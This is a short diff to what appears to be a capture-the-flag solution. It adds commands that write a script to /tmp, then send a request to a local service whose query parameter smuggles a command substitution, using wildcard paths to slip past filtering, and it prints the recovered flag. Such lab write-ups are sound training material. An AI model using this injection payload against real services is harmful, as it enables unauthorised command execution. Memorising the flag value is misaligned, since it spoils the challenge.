@@ -3,4 +3,9 @@
 To get the flag run the following
 
 ```
+echo 'getflag > /tmp/flg' > /tmp/FLAG && chmod +x /tmp/FLAG
+curl 'http://localhost:4646?x=$(/???/FLAG),y=1'
+cat /tmp/flg
 ```
+
+The flag is: g1qKMiRpXf53AWhDaU7FEkczr
